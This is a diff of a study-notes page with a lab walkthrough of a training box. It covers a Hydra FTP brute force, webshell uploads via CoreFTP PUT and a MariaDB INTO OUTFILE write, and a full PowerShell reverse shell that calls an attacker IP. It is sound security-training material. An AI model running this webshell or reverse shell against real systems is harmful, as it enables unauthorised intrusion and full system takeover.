@@ -1,7 +1,17 @@
 ---
-title: "Personal Skills Assessment"
-description: "CPTS study notes, workflows, and references from the vault."
+title: "Common Services: Personal Assessment Notes"
+sidebarTitle: "Assessment walkthrough"
+description: "Read the saved Common Services lab sequence from FTP credential discovery through the resulting service and web-access chain."
+keywords: ["common services assessment", "lab walkthrough", "ftp", "hydra", "fiona", "credential discovery"]
 ---
+
+{/* VAULT_QUICK_NAV_START */}
+
+**Jump to a section**
+
+[Attacking Common Services -Easy (breakdown of what I did so you can add necessary things in notebook)](#attacking-common-services-easy-breakdown-of-what-i-did-so-you-can-add-necessary-things-in-notebook) · [Phase 0 — Credential Access (Hydra + rockyou.txt against FTP)](#phase-0-—-credential-access-hydra-+-rockyou-txt-against-ftp) · [Phase 1 — Confirming Arbitrary File Write via CoreFTP's HTTP(S) Service](#phase-1-—-confirming-arbitrary-file-write-via-coreftps-https-service) · [Mistake #1 — Assuming a Successful PUT Upload Equals Code Execution](#mistake-#1-—-assuming-a-successful-put-upload-equals-code-execution) · [Mistake #2 — Local curl Error Misread as a Server-Side Problem](#mistake-#2-—-local-curl-error-misread-as-a-server-side-problem) · [Phase 2 — Direct MariaDB Access (and Why This Isn't "SQL Injection")](#phase-2-—-direct-mariadb-access-and-why-this-isnt-sql-injection) · [Phase 3 — Writing a Webshell to the Correct Location via SQL](#phase-3-—-writing-a-webshell-to-the-correct-location-via-sql) · [Phase 4 — Basic Command Execution Through the Webshell](#phase-4-—-basic-command-execution-through-the-webshell) · [Phase 5 — Upgrading to an Interactive Reverse Shell](#phase-5-—-upgrading-to-an-interactive-reverse-shell) · [Phase 6 — Post-Exploitation: Confirming Privilege Level](#phase-6-—-post-exploitation-confirming-privilege-level) · [Phase 7 — Locating and Retrieving the Flag](#phase-7-—-locating-and-retrieving-the-flag) · [Mistake #3 — Repeating Mistake #1 With a Second Webshell](#mistake-#3-—-repeating-mistake-#1-with-a-second-webshell) · [Reference — LOAD_FILE() for File Reads (Discussed, Not Needed on This Box)](#reference-—-load_file-for-file-reads-discussed-not-needed-on-this-box) · [Medium was easier.](#medium-was-easier)
+
+{/* VAULT_QUICK_NAV_END */}
 
 {/* Generated from Modules/Attacking Common Services/05 Personal Skills Assessment.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
@@ -9,25 +19,292 @@ Your personal lab sequence and observations.
 
 [Module index](/modules/attacking-common-services)
 
-
 ## Attacking Common Services -Easy (breakdown of what I did so you can add necessary things in notebook)
 
-Phase 0 — Credential Access (Hydra + rockyou.txt against FTP)Before any of the web-facing exploitation could happen, valid credentials were needed. The username fiona had already been identified through earlier enumeration. To get the password, a brute-force attack was run directly against the FTP service (port 21) using Hydra paired with rockyou.txt — the classic leaked-password wordlist (originally from the 2009 RockYou breach) that ships by default with Kali Linux.On Kali, rockyou.txt ships gzip-compressed to save disk space and normally needs to be extracted once before first use:sudo gunzip /usr/share/wordlists/rockyou.txt.gzThen the brute-force itself, testing every password in the list against the known username over FTP:hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://10.129.78.187-l fiona fixes the username, -P &lt;wordlist> feeds Hydra the password list to iterate through, and ftp://&lt;target> tells Hydra which protocol module to use — Hydra has protocol-specific modules (ftp, ssh, http-get, mysql, smb, etc.) and picks behavior accordingly. This eventually produced a hit: fiona:987654321. Those credentials turned out to be valid not just for FTP but also for CoreFTP's HTTP(S) interface and for the MariaDB service itself — a common pattern on these boxes, where a single service account's credentials are reused across multiple exposed services.Lesson for the notebook: always check whether credentials found for one service (FTP here) work against other exposed services on the same box (HTTP Basic Auth, database logins, SMB, etc.) before assuming you need to crack each one separately. Credential reuse across services is extremely common and saves a lot of time.Phase 1 — Confirming Arbitrary File Write via CoreFTP's HTTP(S) ServiceWith fiona:987654321 in hand, the next step was probing what CoreFTP's web-facing interface actually allowed. CoreFTP exposes an HTTP(S) service that, in vulnerable configurations, accepts PUT requests and writes the request body straight to disk as a file. Proof of concept:curl -k -X PUT -H "Host: $target" --basic -u fiona:987654321 --data-binary "PoC." --path-as-is https://$target/docs.txtBreaking this down: -k ignores the self-signed TLS certificate (CoreFTP's HTTPS service isn't using a CA-trusted cert), -X PUT sets the HTTP method to PUT instead of the default GET, -H "Host: $target" sets the Host header explicitly, --basic -u fiona:987654321 sends HTTP Basic Authentication with the cracked credentials, --data-binary "PoC." sends the literal string PoC. as the request body, and --path-as-is stops curl from "cleaning up" the URL path (important once you start trying path traversal or unusual paths — curl by default will collapse things like ../ unless told not to).Verifying the write landed, by requesting the same file back with a normal GET:curl -k -H "Host: $target" --basic -u fiona:987654321 https://$target/docs.txtThis returned PoC. — confirming the server had written our request body to disk and would serve it back on request. Arbitrary file write, confirmed.Critical detail that becomes important later: the response headers on the PUT request included:Server: Core FTP HTTP Server
-Content-type: application/octet-streamThis tells you exactly which server handled the request — CoreFTP's own built-in HTTP server, not Apache/XAMPP. That's a completely separate service from the actual web application stack, even though both are reachable over HTTP(S) on the same box. This distinction is the root cause of a mistake that got made twice later in the session.Mistake #1 — Assuming a Successful PUT Upload Equals Code ExecutionWith file-write access confirmed, the natural next move was uploading an actual PHP webshell the same way:curl -k -X PUT -H "Host: $target" --basic -u fiona:987654321 --data-binary @shell.php --path-as-is https://$target/shell.phpThis succeeded — HTTP/1.1 200 Ok, 5490 bytes written — and it felt like a working exploit chain at that point. But it wasn't. The problem is exactly the detail flagged above: this PUT request goes to CoreFTP's own HTTP server, which just writes and serves raw bytes. It has no PHP interpreter behind it at all. So requesting shell.php back from that server would just return (or, from a browser, download) the literal PHP source code as a static file — it would never actually run. A .php extension means nothing to a server that isn't specifically configured to hand .php requests off to a PHP interpreter.The lesson: a successful file write is not the same thing as code execution. You have to confirm the file lands somewhere a script interpreter is actually watching — in this case, Apache's document root — not just anywhere on disk that happens to be reachable over HTTP. This exact mistake got repeated later in the session with a second webshell (see Mistake #3 below), which is what finally made the pattern fully click.Mistake #2 — Local curl Error Misread as a Server-Side ProblemA later attempt at the same kind of upload produced this:curl -k -X PUT -H "Host: http://10.129.78.187" --basic -u fiona:987654321 --data-binary @shell.php --path-as-is https://10.129.78.187/shell.php
+## Phase 0 — Credential Access (Hydra + rockyou.txt against FTP)
+
+Before any of the web-facing exploitation could happen, valid credentials were needed. The username fiona had already been identified through earlier enumeration. To get the password, a brute-force attack was run directly against the FTP service (port 21) using Hydra paired with rockyou.txt — the classic leaked-password wordlist (originally from the 2009 RockYou breach) that ships by default with Kali Linux.
+
+On Kali, rockyou.txt ships gzip-compressed to save disk space and normally needs to be extracted once before first use:
+
+```text
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+```
+
+Then the brute-force itself, testing every password in the list against the known username over FTP:
+
+```text
+hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://10.129.78.187
+```
+
+-l fiona fixes the username, -P &lt;wordlist> feeds Hydra the password list to iterate through, and ftp://&lt;target> tells Hydra which protocol module to use — Hydra has protocol-specific modules (ftp, ssh, http-get, mysql, smb, etc.) and picks behavior accordingly.
+
+This eventually produced a hit: fiona:987654321. Those credentials turned out to be valid not just for FTP but also for CoreFTP's HTTP(S) interface and for the MariaDB service itself — a common pattern on these boxes, where a single service account's credentials are reused across multiple exposed services.
+
+Lesson for the notebook: always check whether credentials found for one service (FTP here) work against other exposed services on the same box (HTTP Basic Auth, database logins, SMB, etc.) before assuming you need to crack each one separately. Credential reuse across services is extremely common and saves a lot of time.
+
+## Phase 1 — Confirming Arbitrary File Write via CoreFTP's HTTP(S) Service
+
+With fiona:987654321 in hand, the next step was probing what CoreFTP's web-facing interface actually allowed. CoreFTP exposes an HTTP(S) service that, in vulnerable configurations, accepts PUT requests and writes the request body straight to disk as a file.
+
+Proof of concept:
+
+```text
+curl -k -X PUT -H "Host: $target" --basic -u fiona:987654321 --data-binary "PoC." --path-as-is https://$target/docs.txt
+```
+
+Breaking this down: -k ignores the self-signed TLS certificate (CoreFTP's HTTPS service isn't using a CA-trusted cert), -X PUT sets the HTTP method to PUT instead of the default GET, -H "Host: $target" sets the Host header explicitly, --basic -u fiona:987654321 sends HTTP Basic Authentication with the cracked credentials, --data-binary "PoC." sends the literal string PoC. as the request body, and --path-as-is stops curl from "cleaning up" the URL path (important once you start trying path traversal or unusual paths — curl by default will collapse things like ../ unless told not to).
+
+Verifying the write landed, by requesting the same file back with a normal GET:
+
+```text
+curl -k -H "Host: $target" --basic -u fiona:987654321 https://$target/docs.txt
+```
+
+This returned PoC. — confirming the server had written our request body to disk and would serve it back on request. Arbitrary file write, confirmed.
+
+Critical detail that becomes important later: the response headers on the PUT request included:
+
+```text
+Server: Core FTP HTTP Server
+Content-type: application/octet-stream
+```
+
+This tells you exactly which server handled the request — CoreFTP's own built-in HTTP server, not Apache/XAMPP. That's a completely separate service from the actual web application stack, even though both are reachable over HTTP(S) on the same box. This distinction is the root cause of a mistake that got made twice later in the session.
+
+## Mistake #1 — Assuming a Successful PUT Upload Equals Code Execution
+
+With file-write access confirmed, the natural next move was uploading an actual PHP webshell the same way:
+
+```text
+curl -k -X PUT -H "Host: $target" --basic -u fiona:987654321 --data-binary @shell.php --path-as-is https://$target/shell.php
+```
+
+This succeeded — HTTP/1.1 200 Ok, 5490 bytes written — and it felt like a working exploit chain at that point. But it wasn't. The problem is exactly the detail flagged above: this PUT request goes to CoreFTP's own HTTP server, which just writes and serves raw bytes. It has no PHP interpreter behind it at all. So requesting shell.php back from that server would just return (or, from a browser, download) the literal PHP source code as a static file — it would never actually run. A .php extension means nothing to a server that isn't specifically configured to hand .php requests off to a PHP interpreter.
+
+The lesson: a successful file write is not the same thing as code execution. You have to confirm the file lands somewhere a script interpreter is actually watching — in this case, Apache's document root — not just anywhere on disk that happens to be reachable over HTTP.
+
+This exact mistake got repeated later in the session with a second webshell (see Mistake #3 below), which is what finally made the pattern fully click.
+
+## Mistake #2 — Local curl Error Misread as a Server-Side Problem
+
+A later attempt at the same kind of upload produced this:
+
+```text
+curl -k -X PUT -H "Host: http://10.129.78.187" --basic -u fiona:987654321 --data-binary @shell.php --path-as-is https://10.129.78.187/shell.php
 curl: Failed to open shell.php
-curl: option --data-binary: error encountered when reading a fileAt first glance this looks like it could be an auth issue, a TLS issue, or a server-side rejection. It's none of those — it's a purely local filesystem error. The @ prefix in --data-binary @shell.php is special curl syntax meaning "read the request body from this local file" (as opposed to a literal string, which is what the earlier "PoC." example used). Curl tried to open a file called shell.php in the current working directory — which, based on the shell prompt (~), was the home directory — and it wasn't there. Nothing about the target, the network, or the credentials was involved in this failure at all.This became clear by comparing it against a command that did work:curl -k -H "Host: http://10.129.78.187" --basic -u fiona:987654321 https://10.129.78.187/docs.txtThis one has no -X PUT and no --data-binary — it's a plain GET request, so there's no local file dependency to fail on, which is exactly why it succeeded while the PUT command failed.The lesson: when a curl command errors out, check whether the error message is actually about your local machine before assuming it's a target/network/auth problem. The fix here was simply confirming the file existed in the expected location (ls -la shell.php) and either cd-ing to the correct directory or recreating the file.Phase 2 — Direct MariaDB Access (and Why This Isn't "SQL Injection")Since the cracked credentials worked across services, the next move was connecting directly to the database:mysql -h $target -u fiona -p987654321 --ssl=FALSEThis connected successfully as fiona to a MariaDB 10.4.24 instance. -h specifies the host, -u the username, -p&lt;password> the password (no space between -p and the password when passed this way), and --ssl=FALSE disables SSL/TLS for the connection, which was necessary here.An important terminology correction that came up during this session: what's happening here is not SQL injection, even though it sometimes gets casually called that. True SQL injection is a web application vulnerability — it requires a vulnerable app that takes user-supplied input and drops it, unsanitized, into a SQL query it builds internally, letting an attacker break out of the intended query structure with crafted input (e.g., a login form, a search box, a URL parameter like ?id=1). What actually happened here is much simpler: direct, authenticated access to the database service itself, using valid credentials, through the standard MySQL/MariaDB client. There's no web application involved in this step at all — it's just a database login, functionally no different from SSH-ing in with a valid password.This distinction also matters for methodology: if you don't have direct database credentials and only have a web application in front of you, you'd need to find an actual vulnerable parameter first, confirm it's injectable (does a single quote break the page? does an error message change? does response timing shift with a time-based payload?), and only then would techniques like the one below get appended onto your injected query rather than typed directly into a client.Phase 3 — Writing a Webshell to the Correct Location via SQLTwo checks are worth running before attempting a file write from inside MySQL/MariaDB, since they determine whether it's even possible:sqlSHOW GRANTS FOR CURRENT_USER;
-This shows the current user's privileges — file read/write from SQL requires the FILE privilege specifically, separate from normal query permissions.sqlSHOW VARIABLES LIKE 'secure_file_priv';
-This system variable controls where file I/O is allowed: an empty value means no restriction (any path), a specific path means reads/writes are restricted to that directory only, and NULL means the feature is disabled entirely regardless of privileges.With both checks satisfied, the actual write:sqlSELECT "&lt;?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:\\xampp\\htdocs\\test2.php';Breaking down the mechanics: SELECT "&lt;?php echo shell_exec($_GET['c']);?>" is a completely ordinary query that returns a string literal — the fact that the string happens to be valid PHP code is irrelevant to MySQL, it's just text. INTO OUTFILE 'path' is the clause that changes everything: instead of returning that string to the client (your terminal), MySQL writes it to a file at the given path on the server's disk. The double backslashes (\\) are necessary because backslash is MySQL's string-escape character, so \\ inside the string literal produces a single literal \ in the actual file path — meaning the real path written is C:\xampp\htdocs\test2.php, not C:\\xampp\\htdocs\\test2.php.Why this specific path works where the CoreFTP path didn't: C:\xampp\htdocs\ is Apache's actual document root under this XAMPP installation. Files placed here genuinely get parsed and executed by PHP when requested — unlike the CoreFTP server root used in Mistake #1, which just serves raw bytes. This is the single most important distinction in the whole exercise: two different HTTP-accessible directories on the same machine, only one of which runs PHP.The payload itself, &lt;?php echo shell_exec($_GET['c']);?>, is about as minimal as a webshell gets: it reads a URL parameter named c, passes its value to PHP's shell_exec() function (which runs a string as an OS shell command and returns the output), and echoes that output back into the HTTP response. Visiting test2.php?c=whoami runs whoami on the server and prints the result to the page.The general reasoning chain worth remembering (this generalizes well beyond this one box): once you have arbitrary SQL execution — through valid credentials or through a genuine injection point — ask whether the specific DBMS exposes any filesystem access. For MySQL/MariaDB, the answer is yes: INTO OUTFILE for writing, LOAD_FILE() for reading. Then ask whether there's a web server sharing that same filesystem, with a document root your database user can actually write into. If both are true, write a file there in a format the web server will execute rather than just serve statically — turning a database-level write primitive into full remote code execution reachable over plain HTTP.Other techniques that occupy the same conceptual slot, worth having in the notebook even though they weren't used on this box:LOAD_FILE() — the read-side counterpart of INTO OUTFILE. Useful for reconnaissance before deciding where to write anything: reading configuration files, application source code, /etc/passwd, and so on.User-Defined Functions (UDFs) — MySQL/MariaDB can load a custom compiled library that exposes new SQL functions. The classic example is lib_mysqludf_sys, which adds sys_exec() and sys_eval() — letting you run OS commands directly from a SQL query, with no webshell or web server involved at all. This requires higher privileges than a simple INTO OUTFILE (you need to be able to write the library file into the MySQL plugin directory), but it's a more direct path to command execution when available.Equivalent primitives on other database engines: Microsoft SQL Server has xp_cmdshell, a built-in stored procedure for direct OS command execution (often disabled by default but re-enabled via sp_configure if you have sufficient privileges). PostgreSQL has COPY ... TO/FROM PROGRAM, which pipes query output through — or reads query input from — an arbitrary OS command.Phase 4 — Basic Command Execution Through the WebshellWith test2.php sitting in the real web root, it became reachable and functional over plain HTTP:http://inlanefreight.htb/test2.php?c=dir%20C:\Users\Administrator\DesktopThis returned a full directory listing, including flag.txt (39 bytes) — confirming working remote code execution as whatever user Apache was running as.Phase 5 — Upgrading to an Interactive Reverse ShellA one-liner webshell like this works fine for single commands, but it's clunky for anything sustained — every command is a separate HTTP request, there's no persistent working state beyond what you explicitly track, and interactive tools don't work at all. The next step was upgrading to a proper interactive reverse shell using a PowerShell payload delivered as a base64-encoded, UTF-16LE string (the format PowerShell's -e / -EncodedCommand flag expects).Before trusting or running any encoded payload, it was decoded first to confirm exactly what it does:echo "&lt;base64>" | base64 -d | iconv -f UTF-16LE -t UTF-8Which revealed:powershell$client = New-Object System.Net.Sockets.TCPClient("10.10.14.211",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()This is a standard Nishang-style PowerShell TCP reverse shell. Walking through what it actually does: it opens a raw TCP connection out to 10.10.14.211 on port 4444 (the attacker's machine and listening port), then enters a loop that reads whatever bytes arrive on that connection, decodes them as ASCII text, executes that text as a PowerShell command via iex (Invoke-Expression), captures both normal output and errors, appends a fake PS &lt;current path>> prompt to mimic an interactive console, encodes the result back to bytes, and writes it back down the same TCP connection. The loop repeats until the connection closes. Functionally, this turns a raw TCP socket into something that behaves like an interactive PowerShell session from the listener's point of view.Prerequisite — the listener has to exist before the payload runs, since the payload connects outward immediately on execution with no retry logic shown:nc -lvnp 4444A delivery gotcha worth remembering: passing this payload through the webshell's c URL parameter means it has to survive being embedded in a URL query string. Base64 output routinely contains +, /, and = characters, all of which have specific reserved meanings inside a URL (+ often means a literal space in query strings, = separates keys from values, / is a path separator) — pasting the raw base64 into a browser address bar or an unescaped URL will corrupt it before it ever reaches the server. The actual working request used percent-encoding for the space between powershell and -e:http://10.129.78.187/test2.php?c=powershell%20-e%20&lt;base64-blob>This succeeded and produced a persistent, interactive-feeling session — confirmed by the fact that the returned prompt (PS C:\xampp\htdocs>) stuck around across multiple subsequent commands rather than appearing once and disappearing, which is what you'd expect from the loop structure seen in the decoded payload above.Phase 6 — Post-Exploitation: Confirming Privilege Levelwhoami
-Returned nt authority\system — full SYSTEM privileges, the highest local privilege level on Windows.whoami /priv
-Returned a full privilege listing, notably with SeDebugPrivilege, SeImpersonatePrivilege, and SeTcbPrivilege all set to Enabled — consistent with genuine SYSTEM-level access rather than a restricted service account impersonating it.Worth noting for the notebook: XAMPP on Windows is frequently installed and run with its Apache service configured under the SYSTEM account (rather than a dedicated, lower-privileged service account), which is a well-known misconfiguration pattern. It means that getting code execution through the web application at all — via the webshell — immediately hands you SYSTEM, with no separate privilege-escalation phase required. That won't be true on every box, but it's common enough with default XAMPP installs to be worth checking for early.Phase 7 — Locating and Retrieving the FlagThe known path from initial recon was C:\Users\Administrator\Desktop\flag.txt, retrieved directly through the interactive shell established above.For situations where the exact path isn't already known, the general-purpose version of this search:powershellGet-ChildItem -Recurse -Path C:\ -Include *flag* -File -ErrorAction SilentlyContinueor, when only matching a single pattern (this is provider-native filtering and generally faster than -Include):powershellGet-ChildItem -Path C:\ -Recurse -Filter *flag* -File -ErrorAction SilentlyContinue-ErrorAction SilentlyContinue is worth always including on a full-drive recursive search — even under SYSTEM, Windows has certain self-referential junction points and reparse points (like the legacy Documents and Settings compatibility link) that throw access errors during recursion and clutter the output otherwise.Mistake #3 — Repeating Mistake #1 With a Second WebshellLater in the session, a more fully-featured PHP webshell (WhiteWinterWolf's wwwolf-php-webshell) was uploaded using the exact same CoreFTP PUT technique from Phase 1 / Mistake #1:curl -k -X PUT -H "Host: http://10.129.78.187" --basic -u fiona:987654321 --data-binary @/home/WhiteWinterWolf/wwwolf-php-webshell/webshell.php --path-as-is https://10.129.78.187/webshell.phpThis returned HTTP/1.1 200 Ok — the write succeeded. But navigating to https://10.129.78.187/webshell.php in a browser just triggered a file download instead of rendering or executing anything. This is exactly the same root cause as Mistake #1: the PUT request went to CoreFTP's own built-in HTTP server (again identifiable via the earlier-seen Server: Core FTP HTTP Server and Content-type: application/octet-stream headers), which has no PHP interpreter behind it and can only ever serve raw bytes.The correct fix, and the one actually applied: since a fully working SYSTEM shell already existed via test2.php at this point, there was no need to fight the CoreFTP PUT route for this second webshell at all. The existing shell could simply be used to place the file directly into C:\xampp\htdocs\ instead — for example, hosting the file from the attacker box with python3 -m http.server, then pulling it down from inside the target's PowerShell session with Invoke-WebRequest. Once code execution exists through any path, that path becomes the easiest way to deliver everything else, rather than continuing to route new files through a vulnerability that was never going to execute them in the first place.Reference — LOAD_FILE() for File Reads (Discussed, Not Needed on This Box)Since command execution was already achieved by this point, this wasn't actually needed to solve the box — but it's a core technique worth having fully documented for future engagements where SQL access (or an LFI) is the only foothold available, with no RCE yet.Direct form, when the target path is already known:sqlSELECT LOAD_FILE('C:\\Users\\Administrator\\Desktop\\flag.txt');Discovery form, used when the absolute path isn't known in advance:sqlSELECT LOAD_FILE(CONCAT(@@basedir, 'Path_to_the_flag\flag.txt'));@@basedir is a MySQL/MariaDB system variable holding the database software's own installation directory (e.g., C:\xampp\mysql\ on a XAMPP install). Since you always know this value with certainty once connected, it functions as a confirmed anchor point — a real, verified path you can build guesses or traversal off of, rather than blindly guessing an entire absolute path from nothing.The same two prerequisite checks from Phase 3 apply here (FILE privilege, secure_file_priv), plus one extra wrinkle specific to reads: the target file also has to be OS-readable by whichever account the MySQL/MariaDB service itself runs as — not the database user you're logged in as. If the service account can't read the file (say, it's ACL'd to Administrator only), LOAD_FILE just silently returns NULL, even with correct SQL-level privileges and no secure_file_priv restriction blocking the path.General methodology for blind file discovery, when you have a file-read primitive but don't know the layout: fingerprint the OS and version first (SELECT @@version_compile_os;, SELECT @@version;), since that narrows down which default paths are worth trying. Lean on well-known default install locations — C:\xampp\, C:\wamp64\www\, C:\inetpub\wwwroot\ on Windows; /var/www/html/, /etc/ on Linux. Use a small, guaranteed-to-exist file as an initial probe to confirm read access works at all before worrying about anything specific — C:\Windows\win.ini on Windows, /etc/passwd on Linux, are both classic choices. Remember that LOAD_FILE() cannot list directory contents — it can only read an exact filename you already have — so for user-specific paths like C:\Users\&lt;name>\Desktop\, the username has to come from somewhere else entirely (SMB enumeration, RID cycling, earlier recon, or just trying very common defaults like Administrator). And prefer combining multiple recon channels over pure blind guessing — verbose error messages, stack traces, exposed .git directories, and misconfigured directory listings frequently leak full server paths for free. Finally: the moment actual command execution is available, this entire blind-guessing approach becomes unnecessary — direct directory listing (dir / Get-ChildItem) is strictly faster and more reliable than reading one guessed file at a time through SQL.Full Mistake RecapMistake 1 (made twice): treated a successful file write via CoreFTP's PUT vulnerability as equivalent to code execution. It isn't — that PUT lands in CoreFTP's own server root, which has no PHP interpreter and only ever serves raw bytes. Happened first with the initial shell.php, and again later with the WhiteWinterWolf webshell. Root cause both times: confusing "the file was written successfully" with "the file will be executed."Mistake 2: misread a local curl error (Failed to open shell.php, caused by --data-binary @shell.php looking for a local file that wasn't in the current directory) as a server-side or network problem, when it had nothing to do with the target at all.Mistake 3 (terminology): referred to direct, authenticated MySQL/MariaDB client access — using valid, cracked credentials — as "SQL injection." That term specifically describes exploiting a vulnerable web application's own query construction; this was just a database login, no web app or injection involved.
+curl: option --data-binary: error encountered when reading a file
+```
 
+At first glance this looks like it could be an auth issue, a TLS issue, or a server-side rejection. It's none of those — it's a purely local filesystem error. The @ prefix in --data-binary @shell.php is special curl syntax meaning "read the request body from this local file" (as opposed to a literal string, which is what the earlier "PoC." example used). Curl tried to open a file called shell.php in the current working directory — which, based on the shell prompt (~), was the home directory — and it wasn't there. Nothing about the target, the network, or the credentials was involved in this failure at all.
 
+This became clear by comparing it against a command that did work:
 
-Medium was easier.
+```text
+curl -k -H "Host: http://10.129.78.187" --basic -u fiona:987654321 https://10.129.78.187/docs.txt
+```
+
+This one has no -X PUT and no --data-binary — it's a plain GET request, so there's no local file dependency to fail on, which is exactly why it succeeded while the PUT command failed.
+
+The lesson: when a curl command errors out, check whether the error message is actually about your local machine before assuming it's a target/network/auth problem. The fix here was simply confirming the file existed in the expected location (ls -la shell.php) and either cd-ing to the correct directory or recreating the file.
+
+## Phase 2 — Direct MariaDB Access (and Why This Isn't "SQL Injection")
+
+Since the cracked credentials worked across services, the next move was connecting directly to the database:
+
+```text
+mysql -h $target -u fiona -p987654321 --ssl=FALSE
+```
+
+This connected successfully as fiona to a MariaDB 10.4.24 instance. -h specifies the host, -u the username, -p&lt;password> the password (no space between -p and the password when passed this way), and --ssl=FALSE disables SSL/TLS for the connection, which was necessary here.
+
+An important terminology correction that came up during this session: what's happening here is not SQL injection, even though it sometimes gets casually called that. True SQL injection is a web application vulnerability — it requires a vulnerable app that takes user-supplied input and drops it, unsanitized, into a SQL query it builds internally, letting an attacker break out of the intended query structure with crafted input (e.g., a login form, a search box, a URL parameter like ?id=1).
+
+What actually happened here is much simpler: direct, authenticated access to the database service itself, using valid credentials, through the standard MySQL/MariaDB client. There's no web application involved in this step at all — it's just a database login, functionally no different from SSH-ing in with a valid password.
+
+This distinction also matters for methodology: if you don't have direct database credentials and only have a web application in front of you, you'd need to find an actual vulnerable parameter first, confirm it's injectable (does a single quote break the page? does an error message change? does response timing shift with a time-based payload?), and only then would techniques like the one below get appended onto your injected query rather than typed directly into a client.
+
+## Phase 3 — Writing a Webshell to the Correct Location via SQL
+
+Two checks are worth running before attempting a file write from inside MySQL/MariaDB, since they determine whether it's even possible:
+
+```sql
+SHOW GRANTS FOR CURRENT_USER;
+```
+
+This shows the current user's privileges — file read/write from SQL requires the FILE privilege specifically, separate from normal query permissions.
+
+```sql
+SHOW VARIABLES LIKE 'secure_file_priv';
+```
+
+This system variable controls where file I/O is allowed: an empty value means no restriction (any path), a specific path means reads/writes are restricted to that directory only, and NULL means the feature is disabled entirely regardless of privileges.
+
+With both checks satisfied, the actual write:
+
+```sql
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:\\xampp\\htdocs\\test2.php';
+```
+
+Breaking down the mechanics: SELECT "&lt;?php echo shell_exec($_GET['c']);?>" is a completely ordinary query that returns a string literal — the fact that the string happens to be valid PHP code is irrelevant to MySQL, it's just text. INTO OUTFILE 'path' is the clause that changes everything: instead of returning that string to the client (your terminal), MySQL writes it to a file at the given path on the server's disk.
+
+The double backslashes (\\) are necessary because backslash is MySQL's string-escape character, so \\ inside the string literal produces a single literal \ in the actual file path — meaning the real path written is C:\xampp\htdocs\test2.php, not C:\\xampp\\htdocs\\test2.php.
+
+Why this specific path works where the CoreFTP path didn't: C:\xampp\htdocs\ is Apache's actual document root under this XAMPP installation. Files placed here genuinely get parsed and executed by PHP when requested — unlike the CoreFTP server root used in Mistake #1, which just serves raw bytes. This is the single most important distinction in the whole exercise: two different HTTP-accessible directories on the same machine, only one of which runs PHP.
+
+The payload itself, &lt;?php echo shell_exec($_GET['c']);?>, is about as minimal as a webshell gets: it reads a URL parameter named c, passes its value to PHP's shell_exec() function (which runs a string as an OS shell command and returns the output), and echoes that output back into the HTTP response. Visiting test2.php?c=whoami runs whoami on the server and prints the result to the page.
+
+The general reasoning chain worth remembering (this generalizes well beyond this one box): once you have arbitrary SQL execution — through valid credentials or through a genuine injection point — ask whether the specific DBMS exposes any filesystem access. For MySQL/MariaDB, the answer is yes: INTO OUTFILE for writing, LOAD_FILE() for reading.
+
+Then ask whether there's a web server sharing that same filesystem, with a document root your database user can actually write into. If both are true, write a file there in a format the web server will execute rather than just serve statically — turning a database-level write primitive into full remote code execution reachable over plain HTTP.
+
+#### Other techniques that occupy the same conceptual slot, worth having in the notebook even though they weren't used on this box:
+
+LOAD_FILE() — the read-side counterpart of INTO OUTFILE. Useful for reconnaissance before deciding where to write anything: reading configuration files, application source code, /etc/passwd, and so on.
+
+User-Defined Functions (UDFs) — MySQL/MariaDB can load a custom compiled library that exposes new SQL functions. The classic example is lib_mysqludf_sys, which adds sys_exec() and sys_eval() — letting you run OS commands directly from a SQL query, with no webshell or web server involved at all. This requires higher privileges than a simple INTO OUTFILE (you need to be able to write the library file into the MySQL plugin directory), but it's a more direct path to command execution when available.
+
+Equivalent primitives on other database engines: Microsoft SQL Server has xp_cmdshell, a built-in stored procedure for direct OS command execution (often disabled by default but re-enabled via sp_configure if you have sufficient privileges). PostgreSQL has COPY ... TO/FROM PROGRAM, which pipes query output through — or reads query input from — an arbitrary OS command.
+
+## Phase 4 — Basic Command Execution Through the Webshell
+
+With test2.php sitting in the real web root, it became reachable and functional over plain HTTP:
+
+```text
+http://inlanefreight.htb/test2.php?c=dir%20C:\Users\Administrator\Desktop
+```
+
+This returned a full directory listing, including flag.txt (39 bytes) — confirming working remote code execution as whatever user Apache was running as.
+
+## Phase 5 — Upgrading to an Interactive Reverse Shell
+
+A one-liner webshell like this works fine for single commands, but it's clunky for anything sustained — every command is a separate HTTP request, there's no persistent working state beyond what you explicitly track, and interactive tools don't work at all. The next step was upgrading to a proper interactive reverse shell using a PowerShell payload delivered as a base64-encoded, UTF-16LE string (the format PowerShell's -e / -EncodedCommand flag expects).
+
+Before trusting or running any encoded payload, it was decoded first to confirm exactly what it does:
+
+```text
+echo "<base64>" | base64 -d | iconv -f UTF-16LE -t UTF-8
+```
+
+Which revealed:
+
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient("10.10.14.211",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+This is a standard Nishang-style PowerShell TCP reverse shell.
+
+Walking through what it actually does: it opens a raw TCP connection out to 10.10.14.211 on port 4444 (the attacker's machine and listening port), then enters a loop that reads whatever bytes arrive on that connection, decodes them as ASCII text, executes that text as a PowerShell command via iex (Invoke-Expression), captures both normal output and errors, appends a fake PS &lt;current path>> prompt to mimic an interactive console, encodes the result back to bytes, and writes it back down the same TCP connection. The loop repeats until the connection closes.
+
+Functionally, this turns a raw TCP socket into something that behaves like an interactive PowerShell session from the listener's point of view.
+
